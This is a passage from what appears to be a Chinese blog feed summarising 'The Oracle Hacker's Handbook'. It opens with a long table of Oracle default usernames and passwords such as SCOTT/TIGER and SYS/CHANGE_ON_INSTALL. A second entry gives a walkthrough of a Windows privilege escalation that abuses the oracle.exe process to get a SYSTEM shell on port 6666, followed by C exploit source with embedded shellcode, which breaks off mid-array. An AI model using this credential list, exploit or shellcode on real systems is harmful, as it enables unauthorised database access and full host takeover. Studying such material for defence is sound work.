d></tr><tr><td>ITG</td><td>ITG</td></tr><tr><td>JA</td><td>JA</td></tr><tr><td>JD7333</td><td>JD7333</td></tr><tr><td>JD7334</td><td>JD7334</td></tr><tr><td>JD9</td><td>JD9</td></tr><tr><td>JDE</td><td>JDE</td></tr><tr><td>JDEDBA</td><td>JDEDBA</td></tr><tr><td>JE</td><td>JE</td></tr><tr><td>JG</td><td>JG</td></tr><tr><td>JL</td><td>JL</td></tr><tr><td>JOHNINARI</td><td>JOHNINARI</td></tr><tr><td>JONES</td><td>STEEL</td></tr><tr><td>JTF</td><td>JTF</td></tr><tr><td>JTI</td><td>JTI</td></tr><tr><td>JTM</td><td>JTM</td></tr><tr><td>JTR</td><td>JTR</td></tr><tr><td>JTS</td><td>JTS</td></tr><tr><td>JUNK_PS</td><td>JUNK_PS</td></tr><tr><td>JUSTOSHUM</td><td>JUSTOSHUM</td></tr><tr><td>KELLYJONES</td><td>KELLYJONES</td></tr><tr><td>KEVINDONS</td><td>KEVINDONS</td></tr><tr><td>KPN</td><td>KPN</td></tr><tr><td>LADAMS</td><td>LADAMS</td></tr><tr><td>LBA</td><td>LBA</td></tr><tr><td>LBACSYS</td><td>LBACSYS</td></tr><tr><td>LDQUAL</td><td>LDQUAL</td></tr><tr><td>LHILL</td><td>LHILL</td></tr><tr><td>LNS</td><td>LNS</td></tr><tr><td>LQUINCY</td><td>LQUINCY</td></tr><tr><td>LSA</td><td>LSA</td></tr><tr><td>MDDATA</td><td>MDDATA</td></tr><tr><td>MDSYS</td><td>MDSYS</td></tr><tr><td>ME</td><td>ME</td></tr><tr><td>MFG</td><td>MFG</td></tr><tr><td>MGR1</td><td>MGR1</td></tr><tr><td>MGR2</td><td>MGR2</td></tr><tr><td>MGR3</td><td>MGR3</td></tr><tr><td>MGR4</td><td>MGR4</td></tr><tr><td>MIKEIKEGAMI</td><td>MIKEIKEGAMI</td></tr><tr><td>MJONES</td><td>MJONES</td></tr><tr><td>MLAKE</td><td>MLAKE</td></tr><tr><td>MM1</td><td>MM1</td></tr><tr><td>MM2</td><td>MM2</td></tr><tr><td>MM3</td><td>MM3</td></tr><tr><td>MM4</td><td>MM4</td></tr><tr><td>MM5</td><td>MM5</td></tr><tr><td>MMARTIN</td><td>MMARTIN</td></tr><tr><td>MOBILEADMIN</td><td>WELCOME</td></tr><tr><td>MRP</td><td>MRP</td></tr><tr><td>MSC</td><td>MSC</td></tr><tr><td>MSD</td><td>MSD</td></tr><tr><td>MSO</td><td>MSO</td></tr><tr><td>MSR</td><td>MSR</td></tr><tr><td>MST</td><td>MST</td></tr><tr><td>MWA</td><td>MWA</td></tr><tr><td>NEILKATSU</td><td>NEILKATSU</td></tr><tr><td>OBJ7333</td><td>OBJ7333</td></tr><tr><td>OBJ7334</td><td>OBJ7334</td></tr><tr><td>OBJB733</td><td>OBJB733</td></tr><tr><td>OCA</td><td>OCA</td></tr><tr><td>ODM</td><td>ODM</td></tr><tr><td>ODM_MTR</td><td>MTRPW</td></tr><tr><td>ODS</td><td>ODS</td></tr><tr><td>ODSCOMMON</td><td>ODSCOMMON</td></tr><tr><td>OE</td><td>OE</td></tr><tr><td>OKB</td><td>OKB</td></tr><tr><td>OKC</td><td>OKC</td></tr><tr><td>OKE</td><td>OKE</td></tr><tr><td>OKI</td><td>OKI</td></tr><tr><td>OKL</td><td>OKL</td></tr><tr><td>OKO</td><td>OKO</td></tr><tr><td>OKR</td><td>OKR</td></tr><tr><td>OKS</td><td>OKS</td></tr><tr><td>OKX</td><td>OKX</td></tr><tr><td>OL810</td><td>OL810</td></tr><tr><td>OL811</td><td>OL811</td></tr><tr><td>OL812</td><td>OL812</td></tr><tr><td>OL9</td><td>OL9</td></tr><tr><td>OLAPSYS</td><td>MANAGER</td></tr><tr><td>ONT</td><td>ONT</td></tr><tr><td>OPI</td><td>OPI</td></tr><tr><td>ORABAM</td><td>ORABAM</td></tr><tr><td>ORABAMSAMPLES</td><td>ORABAMSAMPLES</td></tr><tr><td>ORABPEL</td><td>ORABPEL</td></tr><tr><td>ORAESB</td><td>ORAESB</td></tr><tr><td>ORAOCA_PUBLIC</td><td>ORAOCA_PUBLIC</td></tr><tr><td>ORASAGENT</td><td>ORASAGENT</td></tr><tr><td>ORASSO</td><td>ORASSO</td></tr><tr><td>ORASSO_DS</td><td>ORASSO_DS</td></tr><tr><td>ORASSO_PA</td><td>ORASSO_PA</td></tr><tr><td>ORASSO_PS</td><td>ORASSO_PS</td></tr><tr><td>ORASSO_PUBLIC</td><td>ORASSO_PUBLIC</td></tr><tr><td>ORDPLUGINS</td><td>ORDPLUGINS</td></tr><tr><td>ORDSYS</td><td>ORDSYS</td></tr><tr><td>OSM</td><td>OSM</td></tr><tr><td>OTA</td><td>OTA</td></tr><tr><td>OUTLN</td><td>OUTLN</td></tr><tr><td>OWAPUB</td><td>OWAPUB</td></tr><tr><td>OWF_MGR</td><td>OWF_MGR</td></tr><tr><td>OZF</td><td>OZF</td></tr><tr><td>OZP</td><td>OZP</td></tr><tr><td>OZS</td><td>OZS</td></tr><tr><td>PA</td><td>PA</td></tr><tr><td>PABLO</td><td>PABLO</td></tr><tr><td>PAIGE</td><td>PAIGE</td></tr><tr><td>PAM</td><td>PAM</td></tr><tr><td>PARRISH</td><td>PARRISH</td></tr><tr><td>PARSON</td><td>PARSON</td></tr><tr><td>PAT</td><td>PAT</td></tr><tr><td>PATORILY</td><td>PATORILY</td></tr><tr><td>PATRICKSANCHEZ</td><td>PATRICKSANCHEZ</td></tr><tr><td>PATSY</td><td>PATSY</td></tr><tr><td>PAUL</td><td>PAUL</td></tr><tr><td>PAULA</td><td>PAULA</td></tr><tr><td>PAXTON</td><td>PAXTON</td></tr><tr><td>PCA1</td><td>PCA1</td></tr><tr><td>PCA2</td><td>PCA2</td></tr><tr><td>PCA3</td><td>PCA3</td></tr><tr><td>PCA4</td><td>PCA4</td></tr><tr><td>PCS1</td><td>PCS1</td></tr><tr><td>PCS2</td><td>PCS2</td></tr><tr><td>PCS3</td><td>PCS3</td></tr><tr><td>PCS4</td><td>PCS4</td></tr><tr><td>PD7333</td><td>PD7333</td></tr><tr><td>PD7334</td><td>PD7334</td></tr><tr><td>PD810</td><td>PD810</td></tr><tr><td>PD811</td><td>PD811</td></tr><tr><td>PD812</td><td>PD812</td></tr><tr><td>PD9</td><td>PD9</td></tr><tr><td>PDA1</td><td>PDA1</td></tr><tr><td>PEARL</td><td>PEARL</td></tr><tr><td>PEG</td><td>PEG</td></tr><tr><td>PENNY</td><td>PENNY</td></tr><tr><td>PERCY</td><td>PERCY</td></tr><tr><td>PERRY</td><td>PERRY</td></tr><tr><td>PETE</td><td>PETE</td></tr><tr><td>PEYTON</td><td>PEYTON</td></tr><tr><td>PHIL</td><td>PHIL</td></tr><tr><td>PJI</td><td>PJI</td></tr><tr><td>PJM</td><td>PJM</td></tr><tr><td>PMI</td><td>PMI</td></tr><tr><td>PN</td><td>PN</td></tr><tr><td>PO</td><td>PO</td></tr><tr><td>POA</td><td>POA</td></tr><tr><td>POLLY</td><td>POLLY</td></tr><tr><td>POM</td><td>POM</td></tr><tr><td>PON</td><td>PON</td></tr><tr><td>PORTAL</td><td>PORTAL</td></tr><tr><td>PORTAL_APP</td><td>PORTAL_APP</td></tr><tr><td>PORTAL_DEMO</td><td>PORTAL_DEMO</td></tr><tr><td>PORTAL_PUBLIC</td><td>PORTAL_PUBLIC</td></tr><tr><td>PORTAL30</td><td>PORTAL30</td></tr><tr><td>PORTAL30_DEMO</td><td>PORTAL30_DEMO</td></tr><tr><td>PORTAL30_PUBLIC</td><td>PORTAL30_PUBLIC</td></tr><tr><td>PORTAL30_SSO</td><td>PORTAL30_SSO</td></tr><tr><td>PORTAL30_SSO_PS</td><td>PORTAL30_SSO_PS</td></tr><tr><td>PORTAL30_SSO_PUBLIC</td><td>PORTAL30_SSO_PUBLIC</td></tr><tr><td>POS</td><td>POS</td></tr><tr><td>PPM1</td><td>PPM1</td></tr><tr><td>PPM2</td><td>PPM2</td></tr><tr><td>PPM3</td><td>PPM3</td></tr><tr><td>PPM4</td><td>PPM4</td></tr><tr><td>PPM5</td><td>PPM5</td></tr><tr><td>PRISTB733</td><td>PRISTB733</td></tr><tr><td>PRISTCTL</td><td>PRISTCTL</td></tr><tr><td>PRISTDTA</td><td>PRISTDTA</td></tr><tr><td>PRODB733</td><td>PRODB733</td></tr><tr><td>PRODCTL</td><td>PRODCTL</td></tr><tr><td>PRODDTA</td><td>PRODDTA</td></tr><tr><td>PRODUSER</td><td>PRODUSER</td></tr><tr><td>PROJMFG</td><td>WELCOME</td></tr><tr><td>PRP</td><td>PRP</td></tr><tr><td>PS</td><td>PS</td></tr><tr><td>PS810</td><td>PS810</td></tr><tr><td>PS810CTL</td><td>PS810CTL</td></tr><tr><td>PS810DTA</td><td>PS810DTA</td></tr><tr><td>PS811</td><td>PS811</td></tr><tr><td>PS811CTL</td><td>PS811CTL</td></tr><tr><td>PS811DTA</td><td>PS811DTA</td></tr><tr><td>PS812</td><td>PS812</td></tr><tr><td>PS812CTL</td><td>PS812CTL</td></tr><tr><td>PS812DTA</td><td>PS812DTA</td></tr><tr><td>PSA</td><td>PSA</td></tr><tr><td>PSB</td><td>PSB</td></tr><tr><td>PSBASS</td><td>PSBASS</td></tr><tr><td>PSEM</td><td>PSEM</td></tr><tr><td>PSFT</td><td>PSFT</td></tr><tr><td>PSFTDBA</td><td>PSFTDBA</td></tr><tr><td>PSP</td><td>PSP</td></tr><tr><td>PTADMIN</td><td>PTADMIN</td></tr><tr><td>PTCNE</td><td>PTCNE</td></tr><tr><td>PTDMO</td><td>PTDMO</td></tr><tr><td>PTE</td><td>PTE</td></tr><tr><td>PTESP</td><td>PTESP</td></tr><tr><td>PTFRA</td><td>PTFRA</td></tr><tr><td>PTG</td><td>PTG</td></tr><tr><td>PTGER</td><td>PTGER</td></tr><tr><td>PTJPN</td><td>PTJPN</td></tr><tr><td>PTUKE</td><td>PTUKE</td></tr><tr><td>PTUPG</td><td>PTUPG</td></tr><tr><td>PTWEB</td><td>PTWEB</td></tr><tr><td>PTWEBSERVER</td><td>PTWEBSERVER</td></tr><tr><td>PV</td><td>PV</td></tr><tr><td>PY7333</td><td>PY7333</td></tr><tr><td>PY7334</td><td>PY7334</td></tr><tr><td>PY810</td><td>PY810</td></tr><tr><td>PY811</td><td>PY811</td></tr><tr><td>PY812</td><td>PY812</td></tr><tr><td>PY9</td><td>PY9</td></tr><tr><td>QA</td><td>QA</td></tr><tr><td>QOT</td><td>QOT</td></tr><tr><td>QP</td><td>QP</td></tr><tr><td>QRM</td><td>QRM</td></tr><tr><td>QS</td><td>QS</td></tr><tr><td>QS_ADM</td><td>QS_ADM</td></tr><tr><td>QS_CB</td><td>QS_CB</td></tr><tr><td>QS_CBADM</td><td>QS_CBADM</td></tr><tr><td>QS_CS</td><td>QS_CS</td></tr><tr><td>QS_ES</td><td>QS_ES</td></tr><tr><td>QS_OS</td><td>QS_OS</td></tr><tr><td>QS_WS</td><td>QS_WS</td></tr><tr><td>RENE</td><td>RENE</td></tr><tr><td>REPADMIN</td><td>REPADMIN</td></tr><tr><td>REPORTS</td><td>REPORTS</td></tr><tr><td>REPORTS_USER</td><td>OEM_TEMP</td></tr><tr><td>RESTRICTED_US</td><td>RESTRICTED_US</td></tr><tr><td>RG</td><td>RG</td></tr><tr><td>RHX</td><td>RHX</td></tr><tr><td>RLA</td><td>RLA</td></tr><tr><td>RLM</td><td>RLM</td></tr><tr><td>RM1</td><td>RM1</td></tr><tr><td>RM2</td><td>RM2</td></tr><tr><td>RM3</td><td>RM3</td></tr><tr><td>RM4</td><td>RM4</td></tr><tr><td>RM5</td><td>RM5</td></tr><tr><td>RMAN</td><td>RMAN</td></tr><tr><td>ROB</td><td>ROB</td></tr><tr><td>RPARKER</td><td>RPARKER</td></tr><tr><td>RWA1</td><td>RWA1</td></tr><tr><td>SALLYH</td><td>SALLYH</td></tr><tr><td>SAM</td><td>SAM</td></tr><tr><td>SARAHMANDY</td><td>SARAHMANDY</td></tr><tr><td>SCM1</td><td>SCM1</td></tr><tr><td>SCM2</td><td>SCM2</td></tr><tr><td>SCM3</td><td>SCM3</td></tr><tr><td>SCM4</td><td>SCM4</td></tr><tr><td>SCOTT</td><td>TIGER</td></tr><tr><td>SDAVIS</td><td>SDAVIS</td></tr><tr><td>SECDEMO</td><td>SECDEMO</td></tr><tr><td>SEDWARDS</td><td>SEDWARDS</td></tr><tr><td>SELLCM</td><td>SELLCM</td></tr><tr><td>SELLER</td><td>SELLER</td></tr><tr><td>SELLTREAS</td><td>SELLTREAS</td></tr><tr><td>SERVICES</td><td>WELCOME</td></tr><tr><td>SETUP</td><td>SETUP</td></tr><tr><td>SH</td><td>SH</td></tr><tr><td>SI_INFORMTN_SCHEMA</td><td>SI_INFORMTN_SCHEMA</td></tr><tr><td>SID</td><td>SID</td></tr><tr><td>SKAYE</td><td>SKAYE</td></tr><tr><td>SKYTETSUKA</td><td>SKYTETSUKA</td></tr><tr><td>SLSAA</td><td>SLSAA</td></tr><tr><td>SLSMGR</td><td>SLSMGR</td></tr><tr><td>SLSREP</td><td>SLSREP</td></tr><tr><td>SRABBITT</td><td>SRABBITT</td></tr><tr><td>SRALPHS</td><td>SRALPHS</td></tr><tr><td>SRAY</td><td>SRAY</td></tr><tr><td>SRIVERS</td><td>SRIVERS</td></tr><tr><td>SSA1</td><td>SSA1</td></tr><tr><td>SSA2</td><td>SSA2</td></tr><tr><td>SSA3</td><td>SSA3</td></tr><tr><td>SSC1</td><td>SSC1</td></tr><tr><td>SSC2</td><td>SSC2</td></tr><tr><td>SSC3</td><td>SSC3</td></tr><tr><td>SSOSDK</td><td>SSOSDK</td></tr><tr><td>SSP</td><td>SSP</td></tr><tr><td>SSS1</td><td>SSS1</td></tr><tr><td>SUPPLIER</td><td>SUPPLIER</td></tr><tr><td>SVM7333</td><td>SVM7333</td></tr><tr><td>SVM7334</td><td>SVM7334</td></tr><tr><td>SVM810</td><td>SVM810</td></tr><tr><td>SVM811</td><td>SVM811</td></tr><tr><td>SVM812</td><td>SVM812</td></tr><tr><td>SVM9</td><td>SVM9</td></tr><tr><td>SVMB733</td><td>SVMB733</td></tr><tr><td>SVP1</td><td>SVP1</td></tr><tr><td>SY810</td><td>SY810</td></tr><tr><td>SY811</td><td>SY811</td></tr><tr><td>SY812</td><td>SY812</td></tr><tr><td>SY9</td><td>SY9</td></tr><tr><td>SYS</td><td>MANAGER</td></tr><tr><td>SYS</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>SYS7333</td><td>SYS7333</td></tr><tr><td>SYS7334</td><td>SYS7334</td></tr><tr><td>SYSADMIN</td><td>SYSADMIN</td></tr><tr><td>SYSB733</td><td>SYSB733</td></tr><tr><td>SYSTEM</td><td>MANAGER</td></tr><tr><td>TDEMARCO</td><td>TDEMARCO</td></tr><tr><td>TDOS_ICSAP</td><td>TDOS_ICSAP</td></tr><tr><td>TESTCTL</td><td>TESTCTL</td></tr><tr><td>TESTDTA</td><td>TESTDTA</td></tr><tr><td>TRA1</td><td>TRA1</td></tr><tr><td>TRACESVR</td><td>TRACE</td></tr><tr><td>TRBM1</td><td>TRBM1</td></tr><tr><td>TRCM1</td><td>TRCM1</td></tr><tr><td>TRDM1</td><td>TRDM1</td></tr><tr><td>TRRM1</td><td>TRRM1</td></tr><tr><td>TWILLIAMS</td><td>TWILLIAMS</td></tr><tr><td>UDDISYS</td><td>UDDISYS</td></tr><tr><td>VEA</td><td>VEA</td></tr><tr><td>VEH</td><td>VEH</td></tr><tr><td>VIDEO31</td><td>VIDEO31</td></tr><tr><td>VIDEO4</td><td>VIDEO4</td></tr><tr><td>VIDEO5</td><td>VIDEO5</td></tr><tr><td>VP1</td><td>VP1</td></tr><tr><td>VP2</td><td>VP2</td></tr><tr><td>VP3</td><td>VP3</td></tr><tr><td>VP4</td><td>VP4</td></tr><tr><td>VP5</td><td>VP5</td></tr><tr><td>VP6</td><td>VP6</td></tr><tr><td>WAA1</td><td>WAA1</td></tr><tr><td>WAA2</td><td>WAA2</td></tr><tr><td>WCRSYS</td><td>WCRSYS</td></tr><tr><td>WEBDB</td><td>WEBDB</td></tr><tr><td>WEBSYS</td><td>WELCOME</td></tr><tr><td>WENDYCHO</td><td>WENDYCHO</td></tr><tr><td>WH</td><td>WH</td></tr><tr><td>WIP</td><td>WIP</td></tr><tr><td>WIRELESS</td><td>WELCOME</td></tr><tr><td>WIRELESS</td><td>WIRELESS</td></tr><tr><td>WK_TEST</td><td>WK_TEST</td></tr><tr><td>WKPROXY</td><td>WKPROXY</td></tr><tr><td>WKSYS</td><td>WKSYS</td></tr><tr><td>WMS</td><td>WMS</td></tr><tr><td>WMSYS</td><td>WMSYS</td></tr><tr><td>WPS</td><td>WPS</td></tr><tr><td>WSH</td><td>WSH</td></tr><tr><td>WSM</td><td>WSM</td></tr><tr><td>XDB</td><td>CHANGE_ON_INSTALL</td></tr><tr><td>XDO</td><td>XDO</td></tr><tr><td>XDP</td><td>XDP</td></tr><tr><td>XLA</td><td>XLA</td></tr><tr><td>XLE</td><td>XLE</td></tr><tr><td>XNB</td><td>XNB</td></tr><tr><td>XNC</td><td>XNC</td></tr><tr><td>XNI</td><td>XNI</td></tr><tr><td>XNM</td><td>XNM</td></tr><tr><td>XNP</td><td>XNP</td></tr><tr><td>XNS</td><td>XNS</td></tr><tr><td>XTR</td><td>XTR</td></tr><tr><td>YCAMPOS</td><td>YCAMPOS</td></tr><tr><td>YSANCHEZ</td><td>YSANCHEZ</td></tr><tr><td>ZFA</td><td>ZFA</td></tr><tr><td>ZPB</td><td>ZPB</td></tr><tr><td>ZSA</td><td>ZSA</td></tr></tbody></table><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li>The Oracle Hacker’s Handbook: Hacking  and Defending Oracle</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;The  Oracle Hacker’s Handbook: Hacking and Defending Oracle&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by David  Litchfield John Wiley &amp;amp; Sons&lt;/</summary>
      
    
    
    
    <category term="数据库安全" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
  <entry>
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 上篇</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/</id>
    <published>2021-07-12T08:06:40.000Z</published>
    <updated>2021-07-14T08:17:18.558Z</updated>
    
    <content type="html"><![CDATA[<p><strong>The  Oracle Hacker’s Handbook: Hacking and Defending Oracle</strong></p><p><strong>by David  Litchfield John Wiley &amp; Sons</strong></p><p>探索黑帽黑客用来入侵和破坏 Oracle 的每一种技术和工具，这份深入指南向您展示了如何找到数据库中的弱点，以便更好地保护它们。</p><p>[TOC]</p><h2 id="Oracle-RDBMS概述"><a href="#Oracle-RDBMS概述" class="headerlink" title="Oracle RDBMS概述"></a>Oracle RDBMS概述</h2><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>​        在Windows上还是在Linux平台上,构成Oracle服务器和服务的过程会有所不同。</p><p>​        数据库实例描述了提供对数据库访问权限的所有进程和内存结构。有两种后台进程，shadow或服务器。shadow或服务器进程服务于客户端请求。换句话说，当客户端连接到TNS侦听器并请求访问数据库服务时，TNS侦听器会将它们移交给服务器进程。该服务器进程接受SQL查询，并代表客户端执行它们。存在后台进程来支持这一点。有许多不同的后台进程，每个进程都有不同的角色，包括数据库编写器，日志编写器，存档器，系统监视器和进程监视器等。</p><p>​        在Linux平台上，这些后台进程中的每个进程都是独立的运行进程，就像在操作系统进程中一样。在Windows上，它们全部打包为一个更大的进程oracle.exe。在Linux的所有进程之间都有一个特殊的内存区域，称为系统全局区域（SGA）。 SGA被实现为内存映射文件（部分），并包含与实例和数据库有关的信息。它还包含一个称为共享池的区域，该区域包含所有用户之间共享的结构，例如表定义等。</p><p>​        在Windows上运行的Oracle流程的一个有趣的方面是，该流程可以由“Everyone”组以编程方式打开。以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1）获取Oracle.exe的进程ID-例如 1892</span><br><span class="line">2）获取数据库SID-例如 ORCL</span><br><span class="line">3）打开2个shell-我们称它们为A和B</span><br><span class="line">4）在命令shell中运行</span><br><span class="line">  C:\&gt;sqlplus /nolog</span><br><span class="line">      SQL*Plus: Release 10.1.0.2.0 - Production on Fri Jun 3 23:18:58</span><br><span class="line">2005</span><br><span class="line">      Copyright (c) 1982, 2004, Oracle. All rights reserved.</span><br><span class="line">      SQL&gt; connect scott/invalidpassword</span><br><span class="line">5）在命令shell B中运行</span><br><span class="line">       C：\&gt; own10g 1892 * oraspawn_buffer_orcl *</span><br><span class="line">6）在命令Shell A中尝试在sqlplus中重新进行身份验证</span><br><span class="line">7）在命令shell B中运行</span><br><span class="line">       C：\&gt; telnet 127.0.0.1 6666</span><br><span class="line">       Microsoft Windows XP [版本5.1.2600]</span><br><span class="line">      Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">     C:\WINDOWS\system32&gt;c:\whoami</span><br><span class="line">      c:\whoami</span><br><span class="line">      NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winbase.h&gt;</span><br><span class="line"></span><br><span class="line">HANDLE hSection=NULL;</span><br><span class="line">unsigned char *p = NULL;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm);</span><br><span class="line">SIZE_T GetSizeOfSection();</span><br><span class="line">int MapTheSection(unsigned int rw);</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[]=</span><br><span class="line">&quot;\x83\xEC\x24\x55\x8B\xEC\xEB\x03\x58\xEB\x05\xE8\xF8\xFF\xFF\xFF&quot;</span><br><span class="line">&quot;\x83\xC0\x7E\x83\xC0\x7B\x50\x99\x64\x8B\x42\x30\x8B\x40\x0C\x8B&quot;</span><br><span class="line">&quot;\x70\x1C\xAD\x8B\x48\x08\x51\x52\x8B\x7D\xFC\x8B\x3C\x57\x57\x8B&quot;</span><br><span class="line">&quot;\x41\x3C\x8B\x7C\x01\x78\x03\xF9\x8B\x5F\x1C\x8B\x77\x20\x8B\x7F&quot;</span><br><span class="line">&quot;\x24\x03\xF1\x03\xD9\x03\xF9\xAD\x91\x33\xF6\x33\xD2\x8A\x14\x08&quot;</span><br><span class="line">&quot;\x41\xC1\xCE\x0D\x03\xF2\x84\xD2\x75\xF3\x83\xC7\x02\x5A\x52\x66&quot;</span><br><span class="line">&quot;\x3B\xF2\x75\xE5\x5A\x5A\x42\x0F\xB7\x4F\xFE\x03\x04\x8B\x89\x44&quot;</span><br><span class="line">&quot;\x95\x04\x59\x80\xFA\x02\x7E\xAE\x80\xFA\x08\x74\x1E\x52\x80\xFA&quot;</span><br><span class="line">&quot;\x03\x74\x02\xEB\xA1\x99\x52\x68\x33\x32\x20\x20\x68\x77\x73\x32&quot;</span><br><span class="line">&quot;\x5F\x54\xFF\xD0\x83\xC4\x0C\x5A\x91\xEB\x8B\x99\xB6\x02\x2B\xE2&quot;</span><br><span class="line">&quot;\x54\x83\xC2\x02\x52\xFF\xD0\x50\x50\x50\x6A\x06\x6A\x01\x6A\x02&quot;</span><br><span class="line">&quot;\xFF\x55\x14\x8D\x65\xD4\x50\x99\x52\x52\x52\xBA\x02\xFF\x1A\x0A&quot;</span><br><span class="line">&quot;\xFE\xC6\x52\x54\x5F\x6A\x10\x57\x50\xFF\x55\x18\x6A\x01\xFF\x75&quot;</span><br><span class="line"></span><br><span 